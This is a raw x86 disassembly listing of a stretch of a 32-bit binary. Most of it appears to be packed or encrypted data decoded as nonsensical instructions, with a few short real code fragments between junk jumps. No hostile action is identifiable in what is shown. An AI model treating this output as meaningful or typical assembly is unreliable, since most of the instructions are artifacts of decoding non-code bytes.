  406b87:	cmp    edi,DWORD PTR [esi+0x7e]
  406b8a:	mov    esp,0xbd7e7e7f
  406b8f:	dec    edx
  406b90:	and    DWORD PTR [ebx],0xffffffe2
  406b93:	xchg   ebp,eax
  406b94:	imul   eax,DWORD PTR [eax],0x5991087b
  406b9a:	or     esi,DWORD PTR [ebp+0x201e96a1]
  406ba0:	fcmovnbe st,st(5)
  406ba2:	retf   
  406ba3:	dec    esp
  406ba4:	daa    
  406ba5:	fwait
  406ba6:	in     eax,dx
  406ba7:	into   
  406ba8:	shl    BYTE PTR [ecx+0x2aeb7871],0x73
  406baf:	xlat   BYTE PTR ds:[ebx]
  406bb0:	inc    eax
  406bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bb2:	loope  0x406c06
  406bb4:	(bad)  
  406bb6:	mov    ah,0xd2
  406bb8:	fisubr DWORD PTR [ebx]
  406bba:	test   BYTE PTR [esi*4+0x1ca5e841],dl
  406bc1:	aaa    
  406bc2:	rol    DWORD PTR [ecx*2+0x6f5f69d5],1
  406bc9:	leave  
  406bca:	add    esi,0x49
  406bcd:	push   ebp
  406bce:	cdq    
  406bcf:	adc    DWORD PTR [edi+0x40],0xb36e5af1
  406bd6:	pop    ebp
  406bd7:	xchg   edi,eax
  406bd8:	sbb    BYTE PTR [edx+0xd],bh
  406bdb:	jns    0x406bf0
  406bdd:	xchg   ebx,eax
  406bde:	ret    
  406bdf:	inc    eax
  406be0:	add    BYTE PTR [ebp+0x3ee10f4d],bh
  406be6:	dec    ebx
  406be7:	cdq    
  406be8:	cmp    edx,esi
  406bea:	(bad)  [edx-0x6b]
  406bed:	pop    es
  406bee:	mov    ch,0xf3
  406bf0:	pop    eax
  406bf1:	sbb    eax,DWORD PTR ds:0xcdd62ce4
  406bf7:	push   ebp
  406bf8:	pop    ds
  406bf9:	cwde   
  406bfa:	push   ebp
  406bfb:	cmc    
  406bfc:	stc    
  406bfd:	enter  0x3cbd,0x60
  406c01:	in     al,dx
  406c02:	add    al,0x29
  406c04:	loop   0x406c33
  406c06:	jne    0x406bfc
  406c08:	js     0x406c18
  406c0a:	adc    esp,ecx
  406c0c:	test   al,0x11
  406c0e:	adc    BYTE PTR [ecx+0x42f5b593],dl
  406c14:	fsub   DWORD PTR [eax+0x44]
  406c17:	lods   al,BYTE PTR ds:[esi]
  406c18:	int3   
  406c19:	cld    
  406c1a:	inc    esp
  406c1b:	and    BYTE PTR [ecx+ecx*8],dl
  406c1e:	jb     0x406be1
  406c20:	aas    
  406c21:	icebp  
  406c22:	fldenv [ebp+0x51525619]
  406c28:	(bad)  
  406c29:	lods   eax,DWORD PTR ds:[esi]
  406c2a:	add    ebx,DWORD PTR [ebx]
  406c2c:	mov    edx,0x424e9ce8
  406c31:	jb     0x406ca4
  406c33:	dec    esi
  406c34:	mov    al,0x11
  406c36:	test   DWORD PTR [ebp+ecx*1+0x2a],edi
  406c3a:	or     edx,DWORD PTR [eax]
  406c3c:	sbb    eax,0x20b6a73b
  406c41:	xor    esp,eax
  406c43:	icebp  
  406c44:	xor    DWORD PTR [edx],eax
  406c46:	add    ebp,0xfba1159f
  406c4c:	or     BYTE PTR [edi+esi*2],dl
  406c4f:	jb     0x406c1b
  406c51:	cwde   
  406c52:	add    BYTE PTR [esi-0x39c18915],ah
  406c58:	sahf   
  406c59:	dec    edi
  406c5a:	xchg   edx,eax
  406c5b:	xor    DWORD PTR [esi],eax
  406c5d:	inc    edi
  406c5e:	add    ebx,DWORD PTR [ebx]
  406c60:	jl     0x406bf6
  406c62:	push   0x2710d97e
  406c67:	(bad)
  406c6b:	in     eax,dx
  406c6c:	ror    dh,0x9a
  406c6f:	test   al,0x4e
  406c71:	pop    ss
  406c72:	xor    eax,DWORD PTR [esi]
  406c74:	test   eax,esp
  406c76:	sub    DWORD PTR [ebx+eax*1+0x2acb99a3],eax
  406c7d:	jmp    0x406c5d
  406c7f:	push   eax
  406c80:	or     dh,al
  406c82:	imul   DWORD PTR [ebx-0x33081a2]
  406c88:	xor    edx,DWORD PTR [esp-0x7c177a0a]
  406c8f:	mov    ds:0x258c98b6,eax
  406c94:	retf   0x3b3f
  406c97:	xor    DWORD PTR [edi-0x55c25efa],eax
  406c9d:	aas    
  406c9e:	sbb    eax,0x62d39f27
  406ca3:	das    
  406ca4:	test   BYTE PTR [edx],ch
  406ca6:	psubd  mm5,QWORD PTR [edx]
  406ca9:	test   DWORD PTR [edx+0x22],edx
  406cac:	mov    eax,0x22d87ea6
  406cb1:	pop    ecx
  406cb2:	xchg   ecx,eax
  406cb3:	rcl    BYTE PTR [edi+ebp*2],1
  406cb6:	cwde   
  406cb7:	out    dx,eax
  406cb8:	mov    bl,0xec
  406cba:	pop    ds
  406cbb:	xchg   DWORD PTR [edi+0xf],ecx
  406cbe:	add    dh,dh
  406cc0:	ds jbe 0x406d1f
  406cc3:	pushf  
  406cc4:	add    BYTE PTR [edx-0x701782ea],cl
  406cca:	add    BYTE PTR [ebx+0x1f],al
  406ccd:	jo     0x406d4d
  406ccf:	jecxz  0x406c90
  406cd1:	push   ecx
  406cd2:	aam    0x49
  406cd4:	test   al,0x98
  406cd6:	or     eax,DWORD PTR [ecx-0x75823d4f]
  406cdc:	es jmp 0x8847:0x24a1a52f
  406ce4:	dec    edx
  406ce5:	xor    eax,DWORD PTR [edi-0x56a5659e]
  406ceb:	fucomp st(6)
  406ced:	mov    dl,BYTE PTR [eax]
  406cef:	fidivr WORD PTR [esi]
  406cf1:	push   es
  406cf2:	mov    esi,0x64248468
  406cf7:	popf   
  406cf8:	inc    eax
  406cf9:	stos   BYTE PTR es:[edi],al
  406cfa:	enter  0xb748,0x4
  406cfe:	add    BYTE PTR [edx],bh
  406d00:	std    
  406d01:	push   edx
  406d02:	jno    0x406cab
  406d04:	inc    ecx
  406d05:	mov    dl,0xd1
  406d07:	and    ecx,DWORD PTR ds:0x29b6ea0
  406d0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d0e:	adc    BYTE PTR ds:0xfdf8dd71,ah
  406d14:	retf   0x47a7
  406d17:	inc    esp
  406d18:	mov    eax,ds:0xefa8677f
  406d1d:	dec    ecx
  406d1e:	and    bh,al
  406d20:	fldcw  WORD PTR [ecx+0x37b627a9]
  406d26:	and    al,0x26
  406d28:	icebp  
  406d29:	retf   
  406d2a:	cmp    ah,BYTE PTR [edi+edx*4+0x7bf71a62]
  406d31:	mov    edx,0x75b78d06
  406d36:	mov    eax,ds:0xaafc5b2f
  406d3b:	daa    
  406d3c:	lea    edx,[edi-0x3c]
  406d3f:	out    dx,eax
  406d40:	add    al,0x3f
  406d42:	and    al,0x8d
  406d44:	aad    0x35
  406d46:	ss jnp 0x406d6a
  406d49:	rcl    BYTE PTR [edx+ebx*1+0x58],1
  406d4d:	jle    0x406d5f
  406d4f:	xlat   BYTE PTR ds:[ebx]
  406d50:	xor    ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x4337af,0x433693
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x4337a3,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x4336e3,0x43368f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x4d
  406d91:	aaa    
  406d92:	sbb    al,0x1a
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0xb07e7e7f
  406d9d:	pop    ebp
  406d9e:	or     bh,BYTE PTR [edx+eiz*8-0x1a]
  406da2:	adc    ch,BYTE PTR [esi+0x72]
  406da5:	fdiv   st,st(7)
  406da7:	ret    0x43f0
  406daa:	scas   al,BYTE PTR es:[edi]
  406dab:	xchg   esp,eax
  406dac:	inc    esp
  406dad:	(bad)  
  406dae:	mov    ds:0x590669bd,al
  406db3:	mov    fs,WORD PTR [edx]
  406db5:	rol    BYTE PTR [ebx-0x4e],0xea
  406db9:	or     esi,DWORD PTR [ebx+0x61]
  406dbc:	sbb    eax,0xfcf3a7b8
  406dc1:	sub    eax,0x7bd92f38
  406dc6:	js     0x406dab
  406dc8:	mov    eax,0x9ef9b41d
  406dcd:	ret    0x36e
  406dd0:	dec    BYTE PTR [esi+0x17ee6a40]
  406dd6:	aam    0xe2
  406dd8:	repnz mov ds:0xf1ea8769,al
  406dde:	sar    eax,0x4c
  406de1:	push   ecx
  406de2:	or     al,BYTE PTR [ecx+0x4d]
  406de5:	sahf   
  406de6:	sti    
  406de7:	and    ch,BYTE PTR [esi+0x30233494]
  406ded:	ret    
  406dee:	inc    edx
  406def:	jp     0x406dde
  406df1:	or     DWORD PTR ds:0xfb50bffb,eax
  406df7:	pop    ss
  406df8:	xchg   ebx,eax
  406df9:	repnz icebp 
  406dfb:	adc    eax,0xddab8758
  406e00:	loope  0x406dd3
  406e02:	scas   eax,DWORD PTR es:[edi]
  406e03:	aad    0x9a
  406e05:	pusha  
  406e06:	dec    edi
  406e07:	dec    edi
  406e08:	jno    0x406dfc
  406e0a:	push   cs
  406e0b:	rcr    DWORD PTR [edi],1
  406e0d:	pop    esi
  406e0e:	inc    BYTE PTR [edx+0x11]
  406e11:	jo     0x406e5f
  406e13:	mov    edx,0x11767754
  406e18:	sbb    eax,0x38693af3
  406e1d:	sar    DWORD PTR [ecx-0x55aee4a7],1
  406e23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e24:	(bad)  
  406e25:	imul   esi,DWORD PTR [ecx-0x286548e],0x36
  406e2c:	xor    BYTE PTR [edx-0x873a3ae],dh
  406e32:	(bad)  
  406e34:	push   ss
  406e35:	ins    BYTE PTR es:[edi],dx
  406e36:	jle    0x406e74
  406e38:	mov    dh,0xd4
  406e3a:	pop    esi
  406e3b:	adc    bl,BYTE PTR [edx+0x6e]
  406e3e:	lahf   
  406e3f:	adc    eax,0xe140046b
  406e44:	or     DWORD PTR [esp+edi*2],ecx
  406e47:	sub    al,0x9d
  406e49:	push   cs
  406e4a:	jle    0x406dd6
  406e4c:	adc    eax,0xd6f024fa
  406e51:	pop    edx
  406e52:	push   es
  406e53:	lds    esi,FWORD PTR [ecx+0x254a5c67]
  406e59:	shl    DWORD PTR [ecx],cl
  406e5b:	mov    al,0x9f
  406e5d:	cmp    al,0xc7
  406e5f:	add    eax,0x417538d7
  406e64:	out    0xb7,eax
  406e66:	sub    DWORD PTR [ecx-0x26],ebp
  406e69:	in     al,dx
  406e6a:	mov    ebx,0x453bedcf
  406e6f:	repz adc eax,0xa1576b5a
  406e75:	out    0x89,eax
  406e77:	mov    edx,DWORD PTR [ecx+0x6d]
  406e7a:	sub    eax,0xadd18328
  406e7f:	fld    DWORD PTR [edi+ebp*1+0x7b]
  406e83:	es push edi
  406e85:	outs   dx,BYTE PTR ds:[esi]
  406e86:	scas   al,BYTE PTR es:[edi]
  406e87:	sbb    eax,DWORD PTR [ebx]
  406e89:	mov    dl,0x10
  406e8b:	push   ecx
  406e8c:	cld    
  406e8d:	sub    esi,esp
  406e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e90:	cs pop ecx
  406e92:	cmp    BYTE PTR [eax+0xc22c25a],cl
  406e98:	(bad)  
  406e99:	daa    
  406e9a:	xor    BYTE PTR [ebp+ebx*1+0x27329bf5],0x6d
  406ea2:	sub    eax,0x3752146
  406ea7:	jae    0x406e5a
  406ea9:	retf   0xf4bb
  406eac:	dec    eax
  406ead:	lahf   
  406eae:	xor    BYTE PTR [eax+ebx*1+0x6d],dl
  406eb2:	and    dl,bl
  406eb4:	pop    ebx
  406eb5:	cmp    ebp,DWORD PTR [ecx]
  406eb7:	and    BYTE PTR [edx],cl
  406eb9:	das    
  406eba:	outs   dx,BYTE PTR ds:[esi]
  406ebb:	xchg   edi,eax
  406ebc:	mov    BYTE PTR [ebx],cl
  406ebe:	aas    
  406ebf:	xchg   DWORD PTR [edx+edi*4+0x46bb5eee],eax
  406ec6:	inc    ebx
  406ec7:	into   
  406ec8:	mov    bh,0x53
  406eca:	xor    DWORD PTR [ebp+0x2997a413],esi
  406ed0:	repz xor al,0xd3
  406ed3:	cwde   
  406ed4:	out    dx,eax
  406ed5:	in     eax,dx
  406ed6:	cmp    edi,DWORD PTR [ebx+0xd419a26]
  406edc:	inc    ebp
  406edd:	fstp   TBYTE PTR [ebx]
  406edf:	push   esi
  406ee0:	adc    esi,DWORD PTR [ecx]
  406ee2:	push   edi
  406ee3:	mov    ds:0xf0c5538,al
  406ee8:	ja     0x406f09
  406eea:	lock jns 0x406ec1
  406eed:	mov    DWORD PTR [edi-0x38],ecx
  406ef0:	jae    0x406f14
  406ef2:	out    0xa0,al
  406ef4:	xchg   esp,eax
  406ef5:	mov    edi,0x2d78070a
  406efa:	pushf  
  406efb:	das    
  406efc:	aam    0x74
  406efe:	fwait
  406eff:	pop    edi
  406f00:	push   edx
  406f01:	add    BYTE PTR [edi+0x3cbe6a2d],cl
  406f07:	mov    fs,edx
  406f09:	jbe    0x406ecc
  406f0b:	jl     0x406f0f
  406f0d:	add    al,0x9b
  406f0f:	mov    ch,0xe7
  406f11:	inc    ebx
  406f12:	mov    edx,ebp
  406f14:	push   ss
  406f15:	push   ecx
  406f16:	jmp    0x406eaf
  406f18:	repnz sub eax,0x1e2e3cd
  406f1e:	sub    eax,0xb747bd4a
  406f23:	and    ebx,esi
  406f25:	iret   
  406f26:	xor    bh,ch
  406f28:	cwde   
  406f29:	pop    edx
  406f2a:	test   al,0xdb
  406f2c:	loopne 0x406ec2
  406f2e:	sub    edi,eax
  406f30:	adc    dh,BYTE PTR fs:[eax-0x84cdc40]
  406f37:	fcomp  QWORD PTR ds:0x1a864166
  406f3d:	push   0x2f
  406f3f:	pop    esi
  406f40:	jnp    0x406f93
  406f42:	je     0x406f9e
  406f44:	rcr    BYTE PTR [ecx+0x36546ea4],0xc6
  406f4b:	cmp    esp,0x1981744c
  406f51:	xor    BYTE PTR ds:0xf5e7fff5,al
  406f57:	mov    es:0xe0fe4574,al
  406f5d:	cmp    esi,edi
  406f5f:	rol    BYTE PTR [ecx+0x43368f25],1
  406f65:	add    bl,dl
  406f67:	ss inc ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0xa94abad
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xb17e7e7f
  406f9f:	test   eax,0xaa54a714
  406fa4:	push   ss
  406fa5:	sub    bh,bh
  406fa7:	push   ds
  406fa8:	pusha  
  406fa9:	test   cl,bh
  406fab:	push   ebp
  406fac:	ficom  DWORD PTR [esi-0x6294e757]
  406fb2:	outs   dx,BYTE PTR ds:[esi]
  406fb3:	cmp    DWORD PTR gs:[ebx+ecx*8+0x7576badf],0x757142b8
  406fbf:	cmp    DWORD PTR [ecx+0x5a],0x93b176ac
  406fc6:	retf   
  406fc7:	stc    
  406fc8:	lds    ebp,FWORD PTR [esi+0x570eea85]
  406fce:	(bad)  
  406fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fd0:	sbb    DWORD PTR es:[eax],ecx
  406fd3:	sbb    eax,0x5e8896a4
  406fd8:	ins    DWORD PTR es:[edi],dx
  406fd9:	and    edi,DWORD PTR [esp+edx*1]
  406fdc:	sbb    eax,0x1b076f0
  406fe1:	mov    bl,0xe5
  406fe3:	imul   edi,DWORD PTR [edi-0x4b],0x68ac443b
  406fea:	xor    bh,BYTE PTR [eax+0x73c602c8]
  406ff0:	jmp    0xce0e9ee7
  406ff5:	mov    ss,WORD PTR ds:0x74fe522a
  406ffb:	repz dec ebx
  406ffd:	xor    edx,eax
  406fff:	leave  
  407000:	ficom  DWORD PTR [ebp+0x14]
  407003:	push   ss
  407004:	jmp    0x95b2:0x189860eb
  40700b:	push   ebx
  40700c:	loop   0x407083
  40700e:	shr    edx,0xb8
  407011:	popf   
  407012:	add    al,0x92
  407014:	sub    al,0xc4
  407016:	addr16 push cs
  407018:	enter  0x5fac,0x43
  40701c:	repnz nop
  40701e:	pop    eax
  40701f:	mov    ds:0xd6dc9514,eax
  407024:	repnz (bad) 
  407028:	push   es
  407029:	in     al,dx
  40702a:	adc    BYTE PTR [edx],dl
  40702c:	sbb    bh,dl
  40702e:	outs   dx,BYTE PTR ds:[esi]
  40702f:	inc    ecx
  407030:	inc    ecx
  407031:	cmp    ebx,DWORD PTR [ebp+0x4e]
  407034:	lods   al,BYTE PTR ds:[esi]
  407035:	jae    0x407063
  407037:	mov    ebx,0x27eb56f2
  40703c:	div    DWORD PTR [ebx+0x60]
  40703f:	lock inc esi
  407041:	ds addr16 add al,0x83
  407045:	jmp    0x9b80bd6b
  40704a:	js     0x406fe2
  40704c:	push   0x8bb51cee
  407051:	sub    bh,BYTE PTR [eax]
  407053:	pop    ss
  407054:	pop    esp
  407055:	inc    ebp
  407056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407057:	jo     0x407081
  407059:	pop    edx
  40705a:	shl    BYTE PTR [ecx+0x76],cl
  40705d:	ror    DWORD PTR [ebp-0x3ca68a02],1
  407063:	repnz add BYTE PTR [esi+esi*4+0x57],cl
  407068:	push   edx
  407069:	imul   ebx,DWORD PTR [edx-0x22c74af2],0xead524e3
  407073:	push   es
  407074:	jl     0x407033
  407076:	pusha  
  407077:	dec    ebp
  407078:	cld    
  407079:	or     edx,DWORD PTR [ecx+0x35]
  40707c:	popa   
  40707d:	dec    ecx
  40707e:	xlat   BYTE PTR ds:[ebx]
  40707f:	add    al,0x31
  407081:	pop    ebp
  407082:	stos   DWORD PTR es:[edi],eax
  407083:	test   eax,0x6de4465e
  407088:	hlt    
  407089:	test   BYTE PTR [edx-0x22ac95f],ch
  40708f:	jmp    0x8461:0x95695900
  407096:	xchg   ebx,eax
  407097:	xchg   ebx,eax
  407098:	in     eax,0xf1
  40709a:	and    edi,DWORD PTR [edx-0x77a774c]
  4070a0:	pop    edx
  4070a1:	mov    cl,ch
  4070a3:	sar    ah,cl
  4070a5:	(bad)  
  4070a6:	cmp    ecx,edi
  4070a8:	adc    cl,dl
  4070aa:	pop    edx
  4070ab:	cwde   
  4070ac:	test   al,0x7a
  4070ae:	add    BYTE PTR [ebx],dh
  4070b0:	enter  0x52a0,0x68
  4070b4:	sub    eax,DWORD PTR [esi]
  4070b6:	ffreep st(4)
  4070b8:	lahf   
  4070b9:	lahf   
  4070ba:	fimul  WORD PTR [ebp+ebx*2-0x7f]
  4070be:	sbb    eax,0x8eadc7fe
  4070c3:	daa    
  4070c4:	inc    esi
  4070c5:	inc    edx
  4070c6:	loop   0x407108
  4070c8:	enter  0xc6de,0x1c
  4070cc:	(bad)  
  4070cd:	pop    ds
  4070ce:	sbb    BYTE PTR es:[esi],ah
  4070d1:	out    dx,al
  4070d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070d3:	sbb    BYTE PTR [ebx],bl
  4070d5:	jmp    0x4070ec
  4070d7:	inc    eax
  4070d8:	xchg   ebx,eax
  4070d9:	lahf   
  4070da:	pushf  
  4070db:	retf   0x6ff
  4070de:	fimul  WORD PTR [eax]
  4070e0:	cmp    eax,eax
  4070e2:	call   0x416:0xb2c447b6
  4070e9:	(bad)  
  4070ea:	push   cs
  4070eb:	jmp    0x4070cd
  4070ed:	loope  0x4070e7
  4070ef:	and    BYTE PTR [ecx+0x48],0x53
  4070f3:	or     ah,BYTE PTR [esi+0x3ffb5de0]
  4070f9:	mov    BYTE PTR ds:0xbec639f6,ah
  4070ff:	fwait
  407100:	call   0x209c:0xe08e1a04
  407107:	adc    ebx,edx
  407109:	pop    esp
  40710a:	loope  0x4070df
  40710c:	xchg   ecx,eax
  40710d:	and    BYTE PTR [ecx-0x5b57581d],dh
  407113:	xchg   ecx,eax
  407114:	push   cs
  407115:	mov    cl,0xab
  407117:	out    dx,al
  407118:	jo     0x4070cb
  40711a:	mov    ds:0x3e724998,eax
  40711f:	adc    eax,0x16957f55
  407124:	dec    ecx
  407125:	ss loopne 0x407133
  407128:	(bad)  
  40712a:	out    dx,al
  40712b:	jg     0x407105
  40712d:	daa    
  40712e:	sub    al,0x93
  407130:	and    DWORD PTR [ebx+0x39],eax
  407133:	(bad)  
  407134:	mov    ebx,0x4e4f7198
  407139:	test   edi,esp
  40713b:	inc    edx
  40713c:	outs   dx,BYTE PTR ds:[esi]
  40713d:	fadd   QWORD PTR [edx+0x5a]
  407140:	dec    ebp
  407141:	xchg   BYTE PTR [edx-0xe],ah
  407144:	sbb    DWORD PTR [eax+0x3e],ebx
  407147:	push   cs
  407148:	aad    0x88
  40714a:	and    edi,DWORD PTR [edi]
  40714c:	sbb    ah,ah
  40714e:	lds    esp,FWORD PTR [eax+0x1e]
  407151:	ret    
  407152:	xchg   DWORD PTR [ebp-0x71aa7ac],esi
  407158:	rcl    ebp,0x34
  40715b:	cmp    dl,cl
  40715d:	sub    dh,BYTE PTR [ebp+ebp*2-0x17f78a01]
  407164:	jmp    0x407167
  407166:	add    BYTE PTR [eax],al
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	adc    eax,0xcc64b42e
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0x17e7e7f
  407188:	xor    esi,esp
  40718a:	and    esp,ebx
  40718c:	mov    eax,0x73df5590
  407191:	jbe    0x4071ac
  407193:	or     al,0x9f
  407195:	mov    edi,0x253628f9
  40719a:	mov    ecx,0x11542980
  40719f:	jecxz  0x40713d
  4071a1:	sbb    eax,0xd981acd3
  4071a6:	mov    edx,0xd2457b21
  4071ab:	inc    edi
  4071ac:	jge    0x40721c
  4071ae:	lods   al,BYTE PTR ds:[esi]
  4071af:	and    al,0x81
  4071b1:	in     al,0xbf
  4071b3:	mov    ?,WORD PTR [esi-0x22]
  4071b6:	inc    eax
  4071b7:	shl    BYTE PTR [ecx],1
  4071b9:	pusha  
  4071ba:	les    esp,FWORD PTR [ecx]
  4071bc:	mov    edi,0x5c592f7f
  4071c1:	pop    esi
  4071c2:	lock js 0x407225
  4071c5:	fcom   QWORD PTR [ebp-0x55]
  4071c8:	sbb    eax,0x9ed6e538
  4071cd:	lea    ebx,[edi]
  4071cf:	or     eax,0x2f9bf53f
  4071d4:	sbb    DWORD PTR [ecx+0x3],ebp
  4071d7:	ja     0x4071c8
  4071d9:	das    
  4071da:	es inc esp
  4071dc:	adc    dh,0xda
  4071df:	xlat   BYTE PTR ds:[ebx]
  4071e0:	aas    
  4071e1:	out    0xd7,al
  4071e3:	push   0x28
  4071e5:	inc    esp
  4071e6:	xor    ebx,edx
  4071e8:	xor    ebx,eax
  4071ea:	je     0x4071b5
  4071ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ed:	push   esi
  4071ee:	add    DWORD PTR [esi+0x5a13f302],0x1b
  4071f5:	fild   QWORD PTR [eax+0x7e62033f]
  4071fb:	pop    DWORD PTR [ecx-0x26]
  4071fe:	mov    bh,0xbe
  407200:	retf   0xed17
  407203:	pop    ds
  407204:	mov    ebx,0x739f5afb
  407209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40720a:	jb     0x407287
  40720c:	outs   dx,BYTE PTR ds:[esi]
  40720d:	cmp    al,0x3e
  40720f:	dec    ebp
  407210:	mov    dl,0xbc
  407212:	lea    ebp,ds:0x31e828fc
  407218:	sti    
  407219:	aaa    
  40721a:	lock ja 0x4071d1
  40721d:	xchg   DWORD PTR [edi-0x1961d30b],esp
  407223:	stos   BYTE PTR es:[edi],al
  407224:	push   esi
  407225:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407226:	sbb    bh,bh
  407228:	pop    edi
  407229:	mov    al,0xff
  40722b:	pop    es
  40722c:	mov    al,0x95
  40722e:	mov    eax,ds:0x5098939b
  407233:	mov    ds:0xc41b0857,eax
  407238:	and    DWORD PTR [ecx],eax
  40723a:	test   eax,0xcedb2bf1
  40723f:	sub    DWORD PTR [ebx],eax
  407241:	mov    ebx,0xfcb67eb7
  407246:	or     ecx,ebp
  407248:	sbb    ah,BYTE PTR [esi+0x3b684e4b]
  40724e:	sub    eax,0xe45ce9e0
  407253:	xchg   ebx,eax
  407255:	rcr    BYTE PTR [ecx-0x19a13ae5],0x89
  40725c:	cs mov esi,0x482330e6
  407262:	add    eax,0x584a60c4
  407267:	push   ss
  407268:	add    DWORD PTR [edi],eax
  40726a:	scas   eax,DWORD PTR es:[edi]
  40726b:	loop   0x40726c
  40726d:	cmc    
  40726e:	test   DWORD PTR [ecx+0x46],ecx
  407271:	stc    
  407272:	cld    
  407273:	mov    cl,0x42
  407275:	mov    gs,ecx
  407277:	ins    DWORD PTR es:[edi],dx
  407278:	push   eax
  407279:	dec    ebp
  40727a:	adc    BYTE PTR [esi],ah
  40727c:	ror    BYTE PTR [esi+edx*8+0x604d43f4],0x99
  407284:	dec    eax
  407285:	std    
  407286:	call   0xb001eb7e
  40728b:	inc    edx
  40728c:	aaa    
  40728d:	loopne 0x4072a5
  40728f:	loopne 0x407220
  407291:	xor    DWORD PTR [edx],0xff3168ea
  407297:	(bad)  
  407298:	hlt    
  407299:	outs   dx,BYTE PTR ds:[esi]
  40729a:	adc    eax,0x1556be52
  40729f:	fisttp DWORD PTR [ebx+0x6e]
  4072a2:	(bad)  
  4072a3:	lods   al,BYTE PTR ds:[esi]
  4072a4:	xchg   ecx,eax
  4072a5:	adc    BYTE PTR [esi+0x54],cl
  4072a8:	xor    eax,0x6dce5de1
  4072ad:	(bad)  
  4072ae:	push   ss
  4072af:	pop    ebp
  4072b0:	cmp    ah,0x55
  4072b3:	fistp  QWORD PTR gs:[ebp-0x1fd5af5e]
  4072ba:	mov    dl,0x14
  4072bc:	push   ebp
  4072bd:	(bad)  
  4072be:	push   ss
  4072bf:	scas   eax,DWORD PTR es:[edi]
  4072c0:	xor    al,0xac
  4072c2:	dec    edx
  4072c3:	call   0x7915a23d
  4072c8:	sbb    BYTE PTR ds:[ecx+ebp*8+0x7def1aec],dl
  4072d0:	mov    ecx,0xfca1115d
  4072d5:	cli    
  4072d6:	mov    bl,0xd4
  4072d8:	and    al,0x51
  4072da:	and    cl,bl
  4072dc:	ins    BYTE PTR es:[edi],dx
  4072dd:	mov    cl,0xc7
  4072df:	fdiv   QWORD PTR [ecx]
  4072e1:	scas   al,BYTE PTR es:[edi]
  4072e2:	or     eax,0x5d321bb1
  4072e7:	aad    0x59
  4072e9:	pop    edx
  4072ea:	push   0x81cc7ed9
  4072ef:	push   0xb66887fd
  4072f4:	xchg   ecx,eax
  4072f5:	mov    ebp,0x67650395
  4072fa:	retf   0x9f60
  4072fd:	push   edi
  4072fe:	sahf   
  4072ff:	lods   al,BYTE PTR ds:[esi]
  407300:	dec    ebp
  407301:	int3   
  407302:	daa    
  407303:	jb     0x40733a
  407305:	pop    es
  407306:	mov    eax,0x53aa2f02
  40730b:	xor    BYTE PTR [edx-0x28],0x17
  40730f:	mov    eax,0x843eae69
  407314:	sbb    eax,0x25f6fc40
  407319:	popa   
  40731a:	push   esp
  40731b:	pop    esi
  40731c:	ins    BYTE PTR es:[edi],dx
  40731d:	push   di
  40731f:	cmc    
  407320:	jp     0x407304
  407322:	(bad)  [eax-0x53]
  407325:	and    BYTE PTR [edi+0x45646f68],al
  40732b:	shr    DWORD PTR [edi+0x16],1
  40732e:	add    dh,cl
  407330:	enter  0x3650,0x50
  407334:	mov    bl,0x7d
  407336:	xor    al,BYTE PTR [ebx+esi*8+0x501f757a]
  40733d:	push   ss
  40733e:	xor    BYTE PTR [ecx-0x31e1dbdd],ah
  407344:	sbb    DWORD PTR [edi+edi*2+0x15],0x27840f9e
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x4336d7,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x4337ab
  40736f:	or     DWORD PTR ds:0x4337af,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407384
  407387:	fild   WORD PTR [ecx]
  407389:	test   DWORD PTR [edx],ecx
  40738b:	ret    0x7e7e
  40738e:	add    eax,0xce7e7e7c
  407393:	inc    edi
  407394:	mov    bh,0x62
  407396:	dec    ecx
  407397:	retf   
  407398:	mov    eax,ds:0x50f4c684
  40739d:	or     BYTE PTR [esi+0xa5fec3d],al
  4073a3:	outs   dx,BYTE PTR ds:[esi]
  4073a4:	mov    edx,0xb7fcfcf2
  4073a9:	call   0xe583983
  4073ae:	add    cl,0x18
